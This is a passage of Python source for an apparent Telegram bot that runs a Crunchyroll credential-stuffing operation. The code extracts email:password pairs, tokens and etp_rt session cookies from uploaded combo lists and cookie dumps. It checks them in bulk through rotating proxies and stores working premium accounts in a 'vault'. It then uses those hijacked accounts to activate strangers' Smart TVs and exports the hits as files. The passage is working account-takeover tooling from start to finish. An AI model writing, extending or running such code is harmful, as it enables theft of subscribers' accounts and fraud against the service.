        return f"http://{parts[0]}:{parts[1]}@{parts[2]}:{parts[3]}"
    if len(parts) == 2 and parts[0] and parts[1].isdigit():
        return f"http://{parts[0]}:{parts[1]}"
    return None


def _merge_live(items: List[dict]):
    with PROXY_LOCK:
        have = {p.get("https") for p in LIVE_PROXIES}
        for p in items:
            if p.get("https") not in have:
                LIVE_PROXIES.append(p)
                have.add(p.get("https"))


def _load_pool_into_live():
    items = pool_load()
    if items:
        _merge_live([{"http": p, "https": p} for p in items])


def add_proxies_to_pool(lines: List[str], auto_check: bool = True):
    existing = pool_load()
    have = set(existing)
    added = invalid = 0
    for ln in lines:
        p = normalize_proxy(ln)
        if not p:
            if ln.strip():
                invalid += 1
            continue
        if p in have:
            continue
        existing.append(p)
        have.add(p)
        added += 1
    pool_save(existing)
    if added:
        if auto_check:
            threading.Thread(target=_background_test_pool, daemon=True).start()
        else:
            _merge_live([{"http": p, "https": p} for p in existing])
    return added, invalid


def _background_test_pool():
    pool_urls = list(set(pool_load()))
    tested = []
    with ThreadPoolExecutor(max_workers=30) as ex:
        futs = {ex.submit(test_proxy_url, p): p for p in pool_urls}
        for fut in as_completed(futs):
            try:
                res = fut.result()
                if res:
                    tested.append(res)
            except Exception:
                continue
    with PROXY_LOCK:
        LIVE_PROXIES[:] = [x for x in LIVE_PROXIES if x.get("https") not in set(pool_urls)]
        _merge_live(tested)
    if not tested and pool_urls:
        _merge_live([{"http": p, "https": p} for p in pool_urls[:10]])


def clear_pool():
    global LAST_PROXY_HARVEST
    pool_save([])
    with PROXY_LOCK:
        LIVE_PROXIES.clear()
        LAST_PROXY_HARVEST = time.time()


# ===================== CREDENTIAL EXTRACTION =====================
EMAIL_PASS_RE = re.compile(r"([A-Za-z0-9._%+\-]+@[A-Za-z0-9.\-]+\.[A-Za-z]{2,}):([^\s\"'<>,]{3,128})")
JWT_RE = re.compile(r"eyJ[A-Za-z0-9_\-]{10,}\.[A-Za-z0-9_\-]{10,}\.[A-Za-z0-9_\-]{5,}")
LABELED_TOKEN_RE = re.compile(r"(?:access[_-]?token|token|bearer)\s*[:=]\s*[\"']?([A-Za-z0-9_\-.+/=]{20,})", re.I)
ETP_RT_RE = re.compile(r"etp_rt[\"'\s:=]+([A-Za-z0-9+/=._\-]{16,})", re.I)


def extract_credentials(text: str) -> List[dict]:
    creds: List[dict] = []
    seen = set()

    # Netscape cookie line support for etp_rt
    for line in (text or "").splitlines():
        line = line.strip()
        if not line or (line.startswith("#") and not line.startswith("#HttpOnly_")):
            continue
        parts = line.split("\t")
        if len(parts) >= 7 and parts[5].strip().lower() == "etp_rt":
            val = parts[6].strip()
            key = ("cookie", val[:60])
            if val and key not in seen:
                seen.add(key)
                creds.append({"type": "cookie", "value": val})

    # JSON cookie export support
    stripped = (text or "").strip()
    if stripped.startswith("[") or stripped.startswith("{"):
        try:
            data = json.loads(stripped)
            items = data if isinstance(data, list) else (data.get("cookies") or [data])
            if isinstance(items, list):
                for item in items:
                    if isinstance(item, dict) and str(item.get("name", "")).lower() == "etp_rt":
                        val = str(item.get("value", "")).strip()
                        key = ("cookie", val[:60])
                        if val and key not in seen:
                            seen.add(key)
                            creds.append({"type": "cookie", "value": val})
        except Exception:
            pass

    for m in EMAIL_PASS_RE.finditer(text or ""):
        email, pw = m.group(1), m.group(2)
        key = ("email", email.lower())
        if key not in seen:
            seen.add(key)
            creds.append({"type": "email", "value": email, "password": pw})

    for m in JWT_RE.finditer(text or ""):
        val = m.group(0)
        key = ("token", val[:60])
        if key not in seen:
            seen.add(key)
            creds.append({"type": "token", "value": val})

    for m in LABELED_TOKEN_RE.finditer(text or ""):
        val = m.group(1).strip().rstrip("\"'")
        if len(val) < 20 or val.lower().startswith(("null", "undefined")):
            continue
        key = ("token", val[:60])
        if key not in seen:
            seen.add(key)
            creds.append({"type": "token", "value": val})

    for m in ETP_RT_RE.finditer(text or ""):
        val = m.group(1).strip()
        key = ("cookie", val[:60])
        if key not in seen:
            seen.add(key)
            creds.append({"type": "cookie", "value": val})

    return creds


# ===================== CHECKER ENGINE =====================
def run_check(text: str, reporter=None, hit_callback=None) -> dict:
    ensure_proxies()
    creds = extract_credentials(text)
    results = {
        "hits": [],
        "free": [],
        "bad": 0,
        "rate": 0,
        "err": 0,
        "twofa": 0,
        "total": len(creds),
        "processed": 0,
        "t0": time.time(),
        "live_feed": [],
        "seconds": 0,
        "cpm": 0,
        "elapsed": 0,
    }
    if not creds:
        return results

    lock = threading.Lock()
    px_idx = [0]

    def next_proxy() -> Optional[dict]:
        with PROXY_LOCK:
            if not LIVE_PROXIES:
                return None
            with lock:
                p = LIVE_PROXIES[px_idx[0] % len(LIVE_PROXIES)]
                px_idx[0] += 1
            return p

    def worker(cred: dict):
        proxy = next_proxy()
        try:
            r = check_credential(cred, proxy)
            if proxy and r["st"] in ("hit", "free"):
                try:
                    url = proxy.get("https", "")
                    with PROXY_LOCK:
                        PROXY_SCORES[url] = PROXY_SCORES.get(url, 0) + 1
                except Exception:
                    pass
            return cred, r["st"], r["data"]
        except Exception as e:
            return cred, "err", dict(_blank_data(""), info=_clean_err(e))

    t0 = time.time()
    results["t0"] = t0
    with ThreadPoolExecutor(max_workers=min(THREADS, max(50, proxy_count() * 2))) as ex:
        futures = {ex.submit(worker, c): c for c in creds}
        for fut in as_completed(futures):
            cred = futures[fut]
            try:
                orig_cred, st, d = fut.result()
            except Exception as e:
                orig_cred, st, d = cred, "err", dict(_blank_data(""), info=_clean_err(e))
            with lock:
                results["processed"] += 1
                try:
                    feed_val = orig_cred.get("value", "") if orig_cred.get("type") == "email" else orig_cred.get("value", "")[:32]
                    results["live_feed"].append(feed_val)
                    if len(results["live_feed"]) > 5:
                        results["live_feed"].pop(0)
                except Exception:
                    pass
                if st == "hit":
                    entry = {"cred": orig_cred, "data": d, "st": "hit"}
                    results["hits"].append(entry)
                    if hit_callback:
                        try:
                            hit_callback(entry)
                        except Exception:
                            pass
                elif st == "free":
                    results["free"].append({"cred": orig_cred, "data": d, "st": "free"})
                elif st == "bad":
                    results["bad"] += 1
                elif st == "rate":
                    results["rate"] += 1
                elif st == "2fa":
                    results["twofa"] += 1
                else:
                    results["err"] += 1

                elapsed = time.time() - t0
                results["elapsed"] = elapsed
                results["cpm"] = _fmt_cpm(results["processed"], elapsed)
                if reporter and results["processed"] % 2 == 0:
                    try:
                        reporter.update(results)
                    except Exception:
                        pass
    elapsed = time.time() - t0
    results["seconds"] = round(elapsed, 1)
    results["elapsed"] = elapsed
    results["cpm"] = _fmt_cpm(results["processed"], elapsed)
    if reporter:
        try:
            reporter.update(results)
            reporter.wait()
        except Exception:
            pass
    return results


def _cred_value(cred: dict) -> str:
    if cred["type"] == "email":
        return f"{cred['value']}:{cred.get('password', '')}"
    return cred["value"]


def make_export(accounts: List[dict], fmt: str = "txt") -> str:
    fd, path = tempfile.mkstemp(suffix=f".{fmt}", prefix="crunchy_")
    os.close(fd)
    p = Path(path)
    if fmt == "json":
        with open(p, "w", encoding="utf-8") as f:
            json.dump(accounts, f, indent=2, ensure_ascii=False, default=str)
    else:
        with open(p, "w", encoding="utf-8") as f:
            for a in accounts:
                d = a.get("data") or {}
                status = "HIT" if a.get("st") == "hit" else "FREE"
                flag = flag_emoji(d.get("cc"))
                f.write(
                    f"{_cred_value(a['cred'])} | {status} | Plan: {d.get('plan') or 'Premium'} | "
                    f"Expiry: {d.get('expiry') or '?'} | Days: {d.get('days_left') or '?'} | "
                    f"Country: {flag + ' ' if flag else ''}{d.get('country_name') or '?'} | "
                    f"Streams: {d.get('streams') or '?'}\n"
                )
    return str(p)


# ===================== PERSISTENT STORE =====================
class Store:
    def __init__(self, path: Path):
        self.path = path
        self.lock = threading.RLock()
        self.codes: Dict[str, dict] = {}
        self.users: Dict[str, dict] = {}
        self.settings: Dict[str, object] = {}
        self._load()

    def _load(self):
        try:
            if self.path.exists():
                data = json.loads(self.path.read_text(encoding="utf-8"))
                self.codes = data.get("codes", {})
                self.users = data.get("users", {})
                self.settings = data.get("settings", {})
        except Exception as e:
            logger.warning("Store load failed: %s", e)

    def save(self):
        with self.lock:
            try:
                tmp = self.path.with_suffix(".tmp")
                tmp.write_text(
                    json.dumps({"codes": self.codes, "users": self.users, "settings": self.settings}, indent=2),
                    encoding="utf-8",
                )
                os.replace(tmp, self.path)
            except Exception as e:
                logger.warning("Store save failed: %s", e)

    def get_setting(self, key, default=None):
        with self.lock:
            return self.settings.get(key, default)

    def set_setting(self, key, value):
        with self.lock:
            self.settings[key] = value
            self.save()

    def get_admins(self):
        with self.lock:
            return list(self.settings.get("admin_ids", []) or [])

    def add_admin(self, uid: int, username: str = None) -> bool:
        with self.lock:
            ids = list(self.settings.get("admin_ids", []) or [])
            uns = list(self.settings.get("admin_usernames", []) or [])
            if uid and uid not in ids and uid != OWNER_ID:
                ids.append(uid)
                self.settings["admin_ids"] = ids
                if username:
                    uns.append(str(username).lstrip("@"))
                    self.settings["admin_usernames"] = uns
                self.save()
                return True
            elif username and username.lstrip("@").lower() not in [x.lower() for x in uns]:
                uns.append(str(username).lstrip("@"))
                self.settings["admin_usernames"] = uns
                self.save()
                return True
            return False

    def remove_admin(self, uid: int = None, username: str = None) -> bool:
        with self.lock:
            ids = list(self.settings.get("admin_ids", []) or [])
            uns = list(self.settings.get("admin_usernames", []) or [])
            changed = False
            if uid and uid in ids:
                ids.remove(uid)
                self.settings["admin_ids"] = ids
                changed = True
            if username:
                un = str(username).lstrip("@").lower()
                for x in list(uns):
                    if x.lower() == un:
                        uns.remove(x)
                        changed = True
                self.settings["admin_usernames"] = uns
            if changed:
                self.save()
            return changed

    def get_premium_only(self, uid: int) -> bool:
        with self.lock:
            info = self.users.get(str(uid))
            if info and "premium_only" in info:
                return bool(info["premium_only"])
        return PREMIUM_ONLY_DEFAULT


STORE: Optional[Store] = None


# ===================== PROGRESS & FORMATTING =====================
def _bar(pct: int, width: int = 20) -> str:
    filled = int(pct / 100 * width)
    return "█" * filled + "░" * (width - filled)


def _live_feed_block(res: dict) -> str:
    feed = res.get("live_feed") or []
    if not feed:
        return "  <i>—</i>"
    return "\n".join(f"  {esc(x)}" for x in feed[-3:])


def progress_text(res: dict) -> str:
    total = res.get("total") or 0
    processed = res.get("processed", 0)
    raw_pct = (processed / total * 100) if total else 0
    pct_str = f"{raw_pct:.1f}" if (raw_pct < 10 and raw_pct != 0) else str(int(raw_pct))
    pct = int(raw_pct)
    elapsed = res.get("elapsed") or (time.time() - res.get("t0", time.time())) if res.get("t0") else 0
    cpm = res.get("cpm") if res.get("cpm") is not None else _fmt_cpm(processed, elapsed)
    eta = _fmt_eta(total, processed, cpm)
    elapsed_s = _fmt_duration(elapsed) if elapsed else "0m 0s"
    twofa = res.get("twofa", 0)
    success_rate = (len(res.get("hits", [])) / processed * 100) if processed else 0

    return (
        f"╭────────────────────────╮\n"
        f"│ 📈 <b>CRUNCHYROLL — LIVE</b> │\n"
        f"╰────────────────────────╯\n"
        f"━━━━━━━━━━━━━━━━━━━━━\n"
        f"⏳ Crunchyroll {pct_str}% [{_bar(pct)}] ({processed}/{total})\n"
        f"✅ Hits: {len(res.get('hits', []))} | 🆓 Free: {len(res.get('free', []))} | "
        f"❌ Bad: {res.get('bad', 0)} | ⏳ Rate: {res.get('rate', 0)} | ⚠️ Errors: {res.get('err', 0)}\n"
        f"🔐 2FA: <code>{twofa}</code> | 🌐 Proxies: <code>{proxy_count()}</code> | ✅ Rate: <code>{success_rate:.1f}%</code>\n"
        f"━━━━━━━━━━━━━━━━━━━━━\n"
        f"📈 <code>{cpm} cpm</code>  🕒 <code>{elapsed_s}</code>  ⏳ ETA <code>{eta}</code>\n"
        f"• Checked: <code>{processed}/{total}</code>  • {pct_str}% • ✅ <code>{len(res.get('hits', []))}</code> hits\n"
        f"📡 <b>Live feed:</b>\n"
        f"{_live_feed_block(res)}"
    )


class ProgressReporter:
    def __init__(self, message, loop: asyncio.AbstractEventLoop, interval: float = 1.8):
        self.message = message
        self.loop = loop
        self.interval = interval
        self.last = 0.0
        self.tasks: List = []

    def update(self, res: dict):
        now = time.time()
        if now - self.last < self.interval:
            return
        self.last = now
        try:
            fut = asyncio.run_coroutine_threadsafe(self._edit(progress_text(res)), self.loop)
            self.tasks.append(fut)
        except Exception:
            pass

    async def _edit(self, text: str):
        try:
            await self.message.edit_text(text, parse_mode=ParseMode.HTML)
        except BadRequest:
            pass
        except Exception:
            pass

    def wait(self):
        for t in self.tasks:
            try:
                t.result(timeout=10)
            except Exception:
                pass
        self.tasks.clear()


def hit_card(entry: dict) -> str:
    cred, d = entry["cred"], entry.get("data") or {}
    L = [
        "⭐ <b>CRUNCHYROLL HIT!</b>",
        "━━━━━━━━━━━━━━━━━━━━━",
    ]
    if cred["type"] == "email":
        L.append(f"📧 Email: <code>{esc(cred['value'])}</code>")
        L.append(f"🔑 Password: <code>{esc(cred.get('password', ''))}</code>")
    else:
        L.append(f"🔑 {cred['type'].title()}: <code>{esc(cred['value'][:60])}</code>")
    L.append("━━━━━━━━━━━━━━━━━━━━━")
    L.append(f"• Plan: <code>{esc(d.get('plan') or 'Premium')}</code>")
    L.append("• Premium: ✅")
    if d.get("expiry"):
        L.append(f"• Expiry: <code>{esc(d.get('expiry'))}</code>")
    if d.get("days_left") and d.get("days_left") != "N/A":
        L.append(f"• Days Left: <code>{esc(str(d.get('days_left')))}</code>")
    L.append(f"• Auto Renew: {'✅' if d.get('renew') else '❌'}")
    L.append(f"• Free Trial: {'✅' if d.get('trial') else '❌'}")
    if d.get("duration"):
        L.append(f"• Plan Duration: <code>{esc(d.get('duration'))}</code>")
    price = str(d.get("price") or "0")
    if d.get("currency"):
        price += f" {d.get('currency')}"
    L.append(f"• Plan Price: <code>{esc(price.strip())}</code>")
    if d.get("cc") or d.get("country_name"):
        flag = flag_emoji(d.get("cc"))
        country = d.get("country_name") or d.get("cc") or "N/A"
        L.append(f"• Country: {flag + ' ' if flag else ''}<code>{esc(country)}</code>")
    if d.get("streams"):
        L.append(f"• Streams: <code>{esc(str(d.get('streams')))}</code>")
    L.append("━━━━━━━━━━━━━━━━━━━━━")
    L.append("🔥 <b>CRUNCHYROLL</b>")
    return "\n".join(L)


def summary_text(res: dict) -> str:
    hits = len(res.get("hits", []))
    free = len(res.get("free", []))
    bad = res.get("bad", 0)
    rate = res.get("rate", 0)
    err = res.get("err", 0)
    twofa = res.get("twofa", 0)
    total = res.get("total", 0)
    processed = res.get("processed", 0)
    sec = res.get("seconds", "?")
    cpm = res.get("cpm", 0)
    return (
        "╭────────────────────────╮\n"
        "│ ✅ <b>SCAN COMPLETE!</b> │\n"
        "╰────────────────────────╯\n"
        "━━━━━━━━━━━━━━━━━━━━━\n"
        f"📊 Total: <code>{total}</code> | Processed: <code>{processed}</code>\n"
        f"✅ Hits: <code>{hits}</code> | 🆓 Free: <code>{free}</code> | ❌ Bad: <code>{bad}</code>\n"
        f"⏳ Rate: <code>{rate}</code> | 🔐 2FA: <code>{twofa}</code> | ⚠️ Errors: <code>{err}</code>\n"
        f"⏱ Time: <code>{sec}s</code> | 📈 Avg: <code>{cpm} cpm</code> | 🗄️ Vault: <code>{vault_count()}</code>\n"
        "━━━━━━━━━━━━━━━━━━━━━\n"
        "🔥 <b>CRUNCHYROLL</b>"
    )


def status_text() -> str:
    return (
        "📊 <b>Bot Status</b>\n"
        "━━━━━━━━━━━━━━━━━━━━━\n"
        f"👑 Owner: <code>{esc(OWNER_USERNAME)}</code>\n"
        f"🗄️ Vault Accounts: <code>{vault_count()}</code>\n"
        f"🌐 Live Proxies: <code>{proxy_count()}</code> | Pool: <code>{pool_size()}</code>\n"
        f"🧵 Threads: <code>{THREADS}</code>\n"
        f"⏱ Uptime: <code>{uptime()}</code>\n"
        f"✅ Checks This Session: <code>{CHECKS_DONE}</code>\n"
        "━━━━━━━━━━━━━━━━━━━━━"
    )


def help_text() -> str:
    return (
        "📖 <b>CRUNCHYROLL BOT HELP</b>\n"
        "━━━━━━━━━━━━━━━━━━━━━\n"
        "📺 <b>Smart TV Login:</b>\n"
        "• Send <code>/tv ABCD12</code> (6-char code on your TV)\n"
        "• Or tap <b>📺 TV Login</b> button\n\n"
        "👑 <b>Admin / Vault Commands:</b>\n"
        "• <code>/upload</code> — Reply to <code>.zip/.txt/.json</code> file to scan & save hits to vault\n"
        "• <code>/vault</code> — View saved accounts in vault\n"
        "• <code>/clearvault</code> — Empty the vault\n"
        "• <code>/proxy</code> — Proxy & Thread settings\n"
        "• <code>/admins</code> — Manage admins\n"
        "━━━━━━━━━━━━━━━━━━━━━"
    )


def welcome_premium_text(uid: int, name: str, username: str = None) -> str:
    admin = is_admin(uid, username)
    role_line = "👑 <b>Owner / Admin</b> • <code>Unlimited</code> ♾️" if admin else "✅ <b>Public User</b> • <code>TV Login Ready</code> 📺"
    return (
        "╭────────────────────────╮\n"
        "│  🔥 <b>CRUNCHYROLL</b> 🔥  │\n"
        "│  <i>Checker • Vault • TV</i>   │\n"
        "╰────────────────────────╯\n"
        f"👋 Hey <b>{esc(name)}</b>\n"
        f"{role_line}\n"
        "┌─ <b>STATS</b> ────────────────┐\n"
        f"│ 🗄️ Vault: <code>{vault_count()} accounts</code>\n"
        f"│ 🌐 Proxies: <code>{proxy_count()} live</code> • 🧵 Threads: <code>{THREADS}</code>\n"
        f"│ ⏱ Uptime: <code>{uptime()}</code> • ✅ Checks: <code>{CHECKS_DONE}</code>\n"
        "└────────────────────────┘\n"
        "📺 <i>Send</i> <code>/tv ABCD12</code> <i>to pair your Smart TV!</i>\n"
        "━━━━━━━━━━━━━━━━━━━━━"
    )


# ===================== BUTTON MENUS =====================
_CAPS = {"style": None}


def _build_kb(rows) -> InlineKeyboardMarkup:
    use_style = _CAPS["style"] is not False
    data = []
    for row in rows or []:
        line = []
        for item in row:
            if not item:
                continue
            label = item[0]
            cb = item[1] if len(item) > 1 else None
            style = item[2] if len(item) > 2 else None
            kwargs = {}
            is_url = isinstance(cb, str) and cb.startswith(("tg://", "https://", "http://"))
            if style and use_style and style in ("primary", "success", "danger") and not is_url:
                kwargs["style"] = style
            if is_url:
                line.append(InlineKeyboardButton(label, url=cb, **kwargs))
            else:
                line.append(InlineKeyboardButton(label, callback_data=cb, **kwargs))
        if line:
            data.append(line)
    return InlineKeyboardMarkup(data)


async def _send_menu(msg, text: str, rows, edit: bool) -> bool:
    for _ in range(3):
        use_style = _CAPS["style"] is not False
        kb = _build_kb(rows)
        try:
            if edit:
                await msg.edit_text(text, parse_mode=ParseMode.HTML, reply_markup=kb)
            else:
                await msg.reply_text(text, parse_mode=ParseMode.HTML, reply_markup=kb)
            if use_style:
                _CAPS["style"] = True
            return True
        except BadRequest as e:
            s = str(e).lower()
            if "message is not modified" in s:
                return True
            if use_style and "style" in s:
                _CAPS["style"] = False
                continue
            logger.warning("menu send failed: %s", e)
            return False
    return False


async def reply_menu(msg, text, rows):
    return await _send_menu(msg, text, rows, edit=False)


async def edit_menu(msg, text, rows):
    return await _send_menu(msg, text, rows, edit=True)


PENDING: Dict[int, dict] = {}
PENDING_LOCK = threading.Lock()


def set_pending(uid: int, kind: str, **kw):
    with PENDING_LOCK:
        PENDING[uid] = {"kind": kind, **kw}


def get_pending(uid: int):
    with PENDING_LOCK:
        return PENDING.get(uid)


def clear_pending(uid: int):
    with PENDING_LOCK:
        PENDING.pop(uid, None)


def menu_main(uid: int, username: str = None):
    header = welcome_premium_text(uid, str(uid), username)
    if is_admin(uid, username):
        rows = [
            [("📺 TV Login", "tv_prompt", "success"), ("🗄️ Vault", "vault_view", "primary")],
            [("💎 Check Account", "check", "success"), ("📂 Check / Upload File", "file", "primary")],
            [("📖 Help", "help", "primary"), ("📊 Bot Stats", "status", "primary")],
            [("⚙️ Proxy Settings", "proxysettings", "primary")],
        ]
        if uid == OWNER_ID:
            rows.append([("👥 Admins", "admins", "primary")])
    else:
        rows = [
            [("📺 TV Login", "tv_prompt", "success"), ("📖 Help", "help", "primary")],
            [("📊 Status", "status", "primary")],
        ]
    return header, rows


def menu_owner():
    auto_on = bool(STORE.get_setting("auto_proxy", True)) if STORE else True
    header = (
        "⚙️ <b>Proxy Settings</b>\n"
        "━━━━━━━━━━━━━━━━━━━━━\n"
        f"📊 Status: <code>{'ON' if proxy_count() else 'OFF'}</code> • 📦 Pool: <code>{pool_size()}</code> • 🌐 Live: <code>{proxy_count()}</code>\n"
        f"🔄 Auto Load: <code>{'ON' if auto_on else 'OFF'}</code> • 🧵 Threads: <code>{THREADS}</code>\n"
        "━━━━━━━━━━━━━━━━━━━━━"
    )
    rows = [
        [("🔄 Refresh Auto", "refresh", "primary"), ("📥 Upload Proxies", "addpx", "success")],
        [("❌ Disable Proxies", "disableproxies", "danger"), ("🧹 Clear Proxies", "clearpool", "danger")],
        [("🔄 Auto Load: ON" if auto_on else "⏸️ Auto Load: OFF", "autoproxy", "primary"), ("🧵 Set Threads", "setthreads", "primary")],
        [("⬅️ Back", "menu", "danger")],
    ]
    return header, rows


# ===================== SMART TV ACTIVATION FLOW =====================
def _process_tv_activation(code: str) -> dict:
    """Picks an account from vault, obtains bearer token, and activates TV."""
    ensure_proxies()
    vault = load_vault()
    if not vault:
        return {"success": False, "error": "no_accounts"}

    # Prefer newest entries first
    candidates = list(reversed(vault))
    attempts = 0
    max_attempts = min(5, len(candidates))

    for entry in candidates[:max_attempts]:
        attempts += 1
        cred = entry.get("cred") or {}
        data = entry.get("data") or {}
        proxy = get_random_proxy()
        ctype = cred.get("type")

        bearer = None
        if ctype == "email":
            j, st = app_login(cred.get("value", ""), cred.get("password", ""), proxy)
            if j and j.get("access_token"):
                bearer = j["access_token"]
            elif st == "bad":
                remove_from_vault(cred)
                continue
            else:
                continue
        elif ctype == "cookie":
            j, err = etp_rt_to_token(cred.get("value", ""), proxy)
            if j and j.get("access_token"):
                bearer = j["access_token"]
            else:
                remove_from_vault(cred)
                continue
        elif ctype == "token":
            tok = cred.get("value", "")
            if is_token_expired(tok):
                remove_from_vault(cred)
                continue
            bearer = tok

        if not bearer:
            continue

        ok, err = activate_tv(bearer, code, proxy)
        if ok:
            return {
                "success": True,
                "plan": data.get("plan") or "Premium",
                "country": data.get("country_name") or data.get("cc") or "Unknown",
                "cc": data.get("cc") or "",
                "expiry": data.get("expiry") or "N/A",
                "streams": data.get("streams") or "N/A",
            }
        low_err = str(err).lower()
        if any(k in low_err for k in ("invalid_code", "expired", "not_found", "user_code")):
            return {"success": False, "error": "invalid_code", "detail": err}
        if "401" in low_err or "403" in low_err or "unauthorized" in low_err:
            remove_from_vault(cred)
            continue

    return {"success": False, "error": "all_failed"}


async def _handle_tv_code(msg, uid: int, username: str, raw_code: str):
    code = re.sub(r"[^A-Za-z0-9]", "", raw_code or "").upper().strip()
    if len(code) != 6:
        await reply_menu(
            msg,
            "❌ <b>Invalid TV Code!</b>\n\nCrunchyroll TV code must be <b>6 alphanumeric characters</b>.\nExample: <code>/tv ABCD12</code>",
            [[("📺 Try Again", "tv_prompt", "success"), ("⬅️ Menu", "menu", "danger")]],
        )
        return

    if vault_count() == 0:
        await reply_menu(
            msg,
            "😔 <b>Vault is Empty!</b>\n\nNo accounts available right now. Wait for admin to upload accounts.",
            [[("⬅️ Menu", "menu", "danger")]],
        )
        return

    allowed, rem = tv_quota_check(uid, username)
    if not allowed:
        await reply_menu(
            msg,
            f"⚠️ <b>Daily TV Limit Reached!</b>\n\nYou have used all <code>{DAILY_TV_LIMIT}</code> TV activations for today.",
            [[("⬅️ Menu", "menu", "danger")]],
        )
        return

    status_msg = await msg.reply_text(
        f"📺 <b>Activating Smart TV...</b>\n━━━━━━━━━━━━━━━━━━━━━\n📟 Code: <code>{code}</code>\n🔍 Selecting working account from vault...",
        parse_mode=ParseMode.HTML,
    )

    res = await asyncio.to_thread(_process_tv_activation, code)

    if res.get("success"):
        tv_quota_inc(uid, username)
        _, rem_after = tv_quota_check(uid, username)
        flag = flag_emoji(res.get("cc"))
        rem_line = f"\n💫 Remaining today: <code>{rem_after}</code>" if not is_admin(uid, username) else ""
        await status_msg.edit_text(
            f"✅ <b>SMART TV ACTIVATED!</b> 🎉\n"
            f"━━━━━━━━━━━━━━━━━━━━━\n"
            f"📟 Code: <code>{code}</code>\n"
            f"📦 Plan: <code>{esc(res.get('plan'))}</code>\n"
            f"🌍 Country: {flag + ' ' if flag else ''}<code>{esc(res.get('country'))}</code>\n"
            f"📅 Expiry: <code>{esc(res.get('expiry'))}</code>\n"
            f"📺 Streams: <code>{esc(str(res.get('streams')))}</code>"
            f"{rem_line}\n"
            f"━━━━━━━━━━━━━━━━━━━━━\n"
            f"🍿 <i>Your TV is now ready to watch Crunchyroll!</i>",
            parse_mode=ParseMode.HTML,
            reply_markup=_build_kb([[("📺 Pair Another TV", "tv_prompt", "success"), ("🏠 Menu", "menu", "danger")]]),
        )
    elif res.get("error") == "invalid_code":
        await status_msg.edit_text(
            f"❌ <b>Invalid or Expired TV Code</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━\n"
            f"📟 Code: <code>{code}</code>\n"
            f"⚠️ Please check your TV screen and try again with a fresh 6-character code.",
            parse_mode=ParseMode.HTML,
            reply_markup=_build_kb([[("📺 Try Again", "tv_prompt", "success"), ("🏠 Menu", "menu", "danger")]]),
        )
    else:
        await status_msg.edit_text(
            f"❌ <b>TV Activation Failed</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━\n"
            f"📟 Code: <code>{code}</code>\n"
            f"⚠️ Working accounts exhausted or blocked. Please try again shortly.",
            parse_mode=ParseMode.HTML,
            reply_markup=_build_kb([[("📺 Try Again", "tv_prompt", "success"), ("🏠 Menu", "menu", "danger")]]),
        )


# ===================== HIT CARDS & CHECK RUNNER =====================
async def send_hit_cards(msg, entries: List[dict], cap: int = MAX_HIT_CARDS) -> int:
    sent = 0
    for e in entries[:cap]:
        card = hit_card(e)
        for _ in range(2):
            try:
                await msg.reply_text(card, parse_mode=ParseMode.HTML)
                sent += 1
                await asyncio.sleep(0.35)
                break
            except RetryAfter as fw:
                ra = fw.retry_after.total_seconds() if hasattr(fw.retry_after, "total_seconds") else float(fw.retry_after)
                await asyncio.sleep(ra + 0.3)
            except Exception:
                return sent
    return sent


async def _run_and_report(msg, uid: int, text: str, save_hits_to_vault: bool = True):
    with USER_LOCK:
        now = time.time()
        if now - USER_LAST_CHECK.get(uid, 0) < 4:
            await reply_menu(msg, "⏳ <b>Slow down</b> — wait a few seconds.", [[("⬅️ Back", "menu", "danger")]])
            return
        if USER_LAST_CHECK.get(f"busy_{uid}"):
            await reply_menu(msg, "⏳ <b>Busy</b> — one scan at a time.", [[("⬅️ Back", "menu", "danger")]])
            return
        USER_LAST_CHECK[f"busy_{uid}"] = True
        USER_LAST_CHECK[uid] = now

    line_count = max(1, text.count("\n") + 1)
    creds_preview = len(extract_credentials(text))
    init_card = (
        f"╭────────────────────────╮\n"
        f"│ 📈 <b>CRUNCHYROLL — LIVE</b> │\n"
        f"╰────────────────────────╯\n"
        f"━━━━━━━━━━━━━━━━━━━━━\n"
        f"📄 Lines: <code>{line_count}</code> • 🎯 Items: <code>{creds_preview}</code>\n"
        f"⏳ Crunchyroll 0% [░░░░░░░░░░░░░░░░░░░░] (0/{creds_preview})\n"
        f"⭐ Hits: <code>0</code> | 🆓 Free: <code>0</code> | 🔐 2FA: <code>0</code> | ❌ Bad: <code>0</code> | ⚠️ Errors: <code>0</code>\n"
        f"━━━━━━━━━━━━━━━━━━━━━\n"
        f"📈 <code>0 cpm</code>  🕒 <code>0m 0s</code>  ⏳ ETA <code>—</code>\n"
        f"📡 <b>Live feed:</b> • <i>starting…</i>"
    )
    note = await msg.reply_text(init_card, parse_mode=ParseMode.HTML)
    loop = asyncio.get_running_loop()
    reporter = ProgressReporter(note, loop)

    def _hit_cb(entry):
        try:
            if save_hits_to_vault:
                add_to_vault([entry])
            asyncio.run_coroutine_threadsafe(send_hit_cards(msg, [entry], cap=1), loop)
        except Exception:
            pass

    try:
        results = await asyncio.to_thread(run_check, text, reporter, _hit_cb)
    except Exception as e:
        with USER_LOCK:
            USER_LAST_CHECK.pop(f"busy_{uid}", None)
        await note.edit_text(
            f"❌ <b>Check error</b>\n━━━━━━━━━━━━━━━━━━━━━\n<code>{esc(str(e)[:120])}</code>",
            parse_mode=ParseMode.HTML,
        )
        return

    if save_hits_to_vault and results["hits"]:
        add_to_vault(results["hits"])

    bump_checks(results["processed"])
    await note.edit_text(summary_text(results), parse_mode=ParseMode.HTML)

    premium_only = STORE.get_premium_only(uid) if STORE else True
    to_send = results["hits"] if premium_only else results["hits"] + results["free"]
    if to_send:
        txt_path = make_export(to_send, "txt")
        json_path = make_export(to_send, "json")
        try:
            with open(txt_path, "rb") as f:
                await msg.reply_document(document=InputFile(f, filename="accounts.txt"), caption=f"💎 Accounts: {len(to_send)}")
            with open(json_path, "rb") as f:
                await msg.reply_document(document=InputFile(f, filename="accounts.json"), caption="📁 JSON export")
        finally:
            Path(txt_path).unlink(missing_ok=True)
            Path(json_path).unlink(missing_ok=True)

    with USER_LOCK:
        USER_LAST_CHECK.pop(f"busy_{uid}", None)

    await reply_menu(
        msg,
        f"✅ <b>Done!</b> Hits: <code>{len(results['hits'])}</code> • Vault Total: <code>{vault_count()}</code>",
        [[("🗄️ View Vault", "vault_view", "primary"), ("📺 TV Login", "tv_prompt", "success")],
         [("⬅️ Main Menu", "menu", "danger")]],
    )


# ===================== FILE & ZIP EXTRACTION HELPER =====================
def _extract_text_from_bytes(filename: str, raw_bytes: bytes) -> str:
    fname = (filename or "").lower()
    if fname.endswith(".zip"):
        chunks = []
        try:
            with zipfile.ZipFile(io.BytesIO(raw_bytes), "r") as zf:
                for zinfo in zf.infolist():
